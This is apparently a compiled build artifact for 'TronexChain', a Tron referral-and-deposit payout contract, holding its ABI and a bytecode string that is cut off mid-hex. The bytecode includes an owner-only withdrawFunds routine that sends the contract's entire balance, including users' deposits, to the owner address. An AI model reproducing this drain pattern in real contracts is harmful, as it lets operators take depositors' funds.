{
  "contractName": "TronexChain",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "PERCENTS_DIVIDER",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "TIME_STEP",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "fee2",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "aff_bonus",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "BASE_PERCENT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "CONTRACT_BALANCE_STEP",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "promo_fee",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_withdraw",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "max_receivable",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "name": "users",
      "outputs": [
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "deposit_payouts",
          "type": "uint256"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        },
        {
          "name": "isActive",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "cycles",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "alt_owner",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "ref_bonuses",
      "outputs": [
        {
          "name": "",
          "type": "uint8"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "team_levels",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "fee1",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_deposited",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "MIN_DEPOSIT",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "total_users",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "admin_fee",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_owner",
          "type": "address"
        },
        {
          "name": "_alt_owner",
          "type": "address"
        },
        {
          "name": "_fee1",
          "type": "address"
        },
        {
          "name": "_fee2",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "upline",
          "type": "address"
        }
      ],
      "name": "Upline",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "NewDeposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "DirectPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "MatchPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdraw",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "LimitReached",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_upline",
          "type": "address"
        }
      ],
      "name": "deposit",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "payoutOf",
      "outputs": [
        {
          "name": "payout",
          "type": "uint256"
        },
        {
          "name": "max_payout",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "getUserDividends",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_balance",
          "type": "uint256"
        }
      ],
      "name": "getTotalSteps",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "pure",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getRate",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getContractBonus",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "maxPayoutOf",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "getUserBalance",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_maxRecPercent",
          "type": "uint256"
        }
      ],
      "name": "changeMaxRec",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newAdmin",
          "type": "address"
        }
      ],
      "name": "changeAdmin",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newfee1",
          "type": "address"
        }
      ],
      "name": "changeFee1",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_newfee2",
          "type": "address"
        }
      ],
      "name": "changeFee2",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getAdmin",
      "outputs": [
        {
          "name": "",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "getNow",
      "outputs": [
        {
          "name": "",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfo",
      "outputs": [
        {
          "name": "upline",
          "type": "address"
        },
        {
          "name": "deposit_time",
          "type": "uint40"
        },
        {
          "name": "deposit_amount",
          "type": "uint256"
        },
        {
          "name": "payouts",
          "type": "uint256"
        },
        {
          "name": "direct_bonus",
          "type": "uint256"
        },
        {
          "name": "gen_bonus",
          "type": "uint256"
        },
        {
          "name": "user_status",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "userInfoTotals",
      "outputs": [
        {
          "name": "referrals",
          "type": "uint256"
        },
        {
          "name": "total_deposits",
          "type": "uint256"
        },
        {
          "name": "total_payouts",
          "type": "uint256"
        },
        {
          "name": "total_structure",
          "type": "uint256"
        },
        {
          "name": "team_biz",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [],
      "name": "contractInfo",
      "outputs": [
        {
          "name": "_total_users",
          "type": "uint256"
        },
        {
          "name": "_total_deposited",
          "type": "uint256"
        },
        {
          "name": "_total_withdraw",
          "type": "uint256"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600455601e600555606460065560196007556001600b553480156200002a57600080fd5b50d380156200003857600080fd5b50d280156200004657600080fd5b5060405160808062004c2b833981018060405260808110156200006857600080fd5b8101908080519060200190929190805190602001909291908051906020019092919080519060200190929190505050836000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555082600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555081600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600a601e908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600a80908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600a6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600a6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600a6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600a6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600a6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600a6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050600a6005908060018154018082558091505090600182039060005260206000209060209182820401919006909192909190916101000a81548160ff021916908360ff16021790555050505050506147ed806200043e6000396000f3fe608060405260043610610258576000357c010000000000000000000000000000000000000000000000000000000090048063850404a11161014b578063bbe4fd50116100c8578063de560cca1161008c578063de560cca14611017578063e1e158a51461105c578063e7cc62bd146110a1578063f340fa01146110e6578063fee3f7f91461112a57610258565b8063bbe4fd5014610e6c578063bf6e196414610eb1578063c34f457a14610ef6578063c609825614610f61578063ca42feab14610fd257610258565b80639acb6b2d1161010f5780639acb6b2d14610bd1578063a87430ba14610c16578063afbce3b914610d23578063b741c62a14610d8c578063b7d9f0d214610dfd57610258565b8063850404a1146109dc5780638959af3c14610a475780638da5cb5b14610ab05780638f28397014610b215780639a8318f414610b8c57610258565b806351754084116101d95780636da61d1e1161019d5780636da61d1e146107c05780636e9960c3146108465780636f9fb98a146108b757806374b95b2d146108fc578063775105e11461099757610258565b806351754084146106575780635988859f1461069c57806362f3765e146106f1578063679aefce146107365780636aabddee1461077b57610258565b806324600fc31161022057806324600fc3146104c057806332bc298c146104f157806339f73a48146105365780633ccfd60b146105a757806347734892146105d857610258565b806301c234a81461025d578063040a772e146102a257806315c43aaf146103215780631959a002146103745780631cf0160c14610457575b600080fd5b34801561026957600080fd5b50d3801561027657600080fd5b50d2801561028357600080fd5b5061028c61116f565b6040518082815260200191505060405180910390f35b3480156102ae57600080fd5b50d380156102bb57600080fd5b50d280156102c857600080fd5b5061030b600480360360208110156102df57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611175565b6040518082815260200191505060405180910390f35b34801561032d57600080fd5b50d3801561033a57600080fd5b50d2801561034757600080fd5b5061035061145e565b60405180848152602001838152602001828152602001935050505060405180910390f35b34801561038057600080fd5b50d3801561038d57600080fd5b50d2801561039a57600080fd5b506103dd600480360360208110156103b157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050611477565b604051808873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018764ffffffffff1664ffffffffff16815260200186815260200185815260200184815260200183815260200182815260200197505050505050505060405180910390f35b34801561046357600080fd5b50d3801561047057600080fd5b50d2801561047d57600080fd5b506104aa6004803603602081101561049457600080fd5b81019080803590602001909291905050506116a1565b6040518082815260200191505060405180910390f35b3480156104cc57600080fd5b50d380156104d957600080fd5b50d280156104e657600080fd5b506104ef611711565b005b3480156104fd57600080fd5b50d3801561050a57600080fd5b50d2801561051757600080fd5b506105206118ae565b6040518082815260200191505060405180910390f35b34801561054257600080fd5b50d3801561054f57600080fd5b50d2801561055c57600080fd5b506105656118b3565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156105b357600080fd5b50d380156105c057600080fd5b50d280156105cd57600080fd5b506105d66118d9565b005b3480156105e457600080fd5b50d380156105f157600080fd5b50d280156105fe57600080fd5b506106416004803603602081101561061557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612287565b6040518082815260200191505060405180910390f35b34801561066357600080fd5b50d3801561067057600080fd5b50d2801561067d57600080fd5b50610686612760565b6040518082815260200191505060405180910390f35b3480156106a857600080fd5b50d380156106b557600080fd5b50d280156106c257600080fd5b506106ef600480360360208110156106d957600080fd5b8101908080359060200190929190505050612765565b005b3480156106fd57600080fd5b50d3801561070a57600080fd5b50d2801561071757600080fd5b5061072061288b565b6040518082815260200191505060405180910390f35b34801561074257600080fd5b50d3801561074f57600080fd5b50d2801561075c57600080fd5b50610765612890565b6040518082815260200191505060405180910390f35b34801561078757600080fd5b50d3801561079457600080fd5b50d280156107a157600080fd5b506107aa6128f8565b6040518082815260200191505060405180910390f35b3480156107cc57600080fd5b50d380156107d957600080fd5b50d280156107e657600080fd5b50610829600480360360208110156107fd57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291905050506128ff565b604051808381526020018281526020019250505060405180910390f35b34801561085257600080fd5b50d3801561085f57600080fd5b50d2801561086c57600080fd5b50610875612be1565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b3480156108c357600080fd5b50d380156108d057600080fd5b50d280156108dd57600080fd5b506108e6612c0a565b6040518082815260200191505060405180910390f35b34801561090857600080fd5b50d3801561091557600080fd5b50d2801561092257600080fd5b506109656004803603602081101561093957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612c29565b604051808681526020018581526020018481526020018381526020018281526020019550505050505060405180910390f35b3480156109a357600080fd5b50d380156109b057600080fd5b50d280156109bd57600080fd5b506109c6612d93565b6040518082815260200191505060405180910390f35b3480156109e857600080fd5b50d380156109f557600080fd5b50d28015610a0257600080fd5b50610a4560048036036020811015610a1957600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612d99565b005b348015610a5357600080fd5b50d38015610a6057600080fd5b50d28015610a6d57600080fd5b50610a9a60048036036020811015610a8457600080fd5b8101908080359060200190929190505050612f51565b6040518082815260200191505060405180910390f35b348015610abc57600080fd5b50d38015610ac957600080fd5b50d28015610ad657600080fd5b50610adf612f8e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b348015610b2d57600080fd5b50d38015610b3a57600080fd5b50d28015610b4757600080fd5b50610b8a60048036036020811015610b5e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050612fb3565b005b348015610b9857600080fd5b50d38015610ba557600080fd5b50d28015610bb257600080fd5b50610bbb613112565b6040518082815260200191505060405180910390f35b348015610bdd57600080fd5b50d38015610bea57600080fd5b50d28015610bf757600080fd5b50610c00613118565b6040518082815260200191505060405180910390f35b348015610c2257600080fd5b50d38015610c2f57600080fd5b50d28015610c3c57600080fd5b50610c7f60048036036020811015610c5357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061311e565b604051808e73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018d81526020018c81526020018b81526020018a81526020018981526020018881526020018764ffffffffff1664ffffffffff1681526020018681526020018581526020018481526020018381526020018281526020019d505050505050505050505050505060405180910390f35b348015610d2f57600080fd5b50d38015610d3c57600080fd5b50d28015610d4957600080fd5b50610d7660048036036020811015610d6057600080fd5b81019080803590602001909291905050506131b5565b6040518082815260200191505060405180910390f35b348015610d9857600080fd5b50d38015610da557600080fd5b50d28015610db257600080fd5b50610dbb6131d8565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b348015610e0957600080fd5b50d38015610e1657600080fd5b50d28015610e2357600080fd5b50610e5060048036036020811015610e3a57600080fd5b81019080803590602001909291905050506131fe565b604051808260ff1660ff16815260200191505060405180910390f35b348015610e7857600080fd5b50d38015610e8557600080fd5b50d28015610e9257600080fd5b50610e9b613231565b6040518082815260200191505060405180910390f35b348015610ebd57600080fd5b50d38015610eca57600080fd5b50d28015610ed757600080fd5b50610ee0613239565b6040518082815260200191505060405180910390f35b348015610f0257600080fd5b50d38015610f0f57600080fd5b50d28015610f1c57600080fd5b50610f5f60048036036020811015610f3357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061323f565b005b348015610f6d57600080fd5b50d38015610f7a57600080fd5b50d28015610f8757600080fd5b50610f906133f7565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b348015610fde57600080fd5b50d38015610feb57600080fd5b50d28015610ff857600080fd5b5061100161341d565b6040518082815260200191505060405180910390f35b34801561102357600080fd5b50d3801561103057600080fd5b50d2801561103d57600080fd5b50611046613482565b6040518082815260200191505060405180910390f35b34801561106857600080fd5b50d3801561107557600080fd5b50d2801561108257600080fd5b5061108b613488565b6040518082815260200191505060405180910390f35b3480156110ad57600080fd5b50d380156110ba57600080fd5b50d280156110c757600080fd5b506110d061348f565b6040518082815260200191505060405180910390f35b611128600480360360208110156110fc57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050613495565b005b34801561113657600080fd5b50d3801561114357600080fd5b50d2801561115057600080fd5b506111596134ac565b6040518082815260200191505060405180910390f35b61271081565b6000803073ffffffffffffffffffffffffffffffffffffffff16638959af3c600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600501546040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004018082815260200191505060206040518083038186803b15801561122757600080fd5b505afa15801561123b573d6000803e3d6000fd5b505050506040513d602081101561125157600080fd5b81019080805190602001909291905050509050600061126e6134b2565b9050600082600860008773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154101561145357600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015461271060b4600860008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff1664ffffffffff16420381151561136a57fe5b0484600860008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206005015402028115156113ba57fe5b040390508281600860008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006015401111561145257600860008673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060060154830390505b5b809350505050919050565b6000806000600b54600c54600d54925092509250909192565b6000806000806000806000600860008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600860008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070160009054906101000a900464ffffffffff16600860008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060050154600860008c73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154600860008d73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154600860008e73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154600860008f73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c01549650965096509650965096509650919395979092949650565b6000806000905060008090506000620f424085029050600062989680828115156116c757fe5b0490506032811115156116e357600281029350600092506116fd565b606493506002606460028302038115156116f957fe5b0492505b600083850190508095505050505050919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614806117b95750600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16145b151561182d576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f4e6f7420616c6c6f77656400000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156118ab573d6000803e3d6000fd5b50565b60b481565b600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000803073ffffffffffffffffffffffffffffffffffffffff16636da61d1e336040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604080518083038186803b15801561197457600080fd5b505afa158015611988573d6000803e3d6000fd5b505050506040513d604081101561199e57600080fd5b8101908080519060200190929190805190602001909291905050509150915080600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154101515611a76576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600c8152602001807f46756c6c207061796f757473000000000000000000000000000000000000000081525060200191505060405180910390fd5b6000821115611bbe578082600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115611b1357600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154810391505b81600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206006016000828254019250508190555081600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160008282540192505081905550611bbd338361351a565b5b80600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154108015611c5157506000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030154115b15611dd8576000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003015490508181600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115611d3157600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b80600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206003016000828254039250508190555080600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201600082825401925050819055508083019250505b80600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154108015611e6b57506000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060040154115b15611ff2576000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004015490508181600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154011115611f4b57600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154820390505b80600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206004016000828254039250508190555080600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201600082825401925050819055508083019250505b60008211151561206a576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252600b8152602001807f5a65726f207061796f757400000000000000000000000000000000000000000081525060200191505060405180910390fd5b81600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206009016000828254019250508190555081600d600082825401925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc839081150290604051600060405180830381858888f19350505050158015612110573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a9424364836040518082815260200191505060405180910390a280600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020154101515612283573373ffffffffffffffffffffffffffffffffffffffff167f97ddeb77c85e6a1dd99a34fe2bb1a4f9b211d5ffced7a707de9dbeb24363d0e4600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600201546040518082815260200191505060405180910390a26000600860003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600c01819055505b5050565b60008060003073ffffffffffffffffffffffffffffffffffffffff16636da61d1e856040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050604080518083038186803b15801561232457600080fd5b505afa158015612338573d6000803e3d6000fd5b505050506040513d604081101561234e57600080fd5b81019080805190602001909291908051906020019092919050505091509150600082111561240b578082600860008773ffffffffffffffffffffffffffffffffffffffff1673ff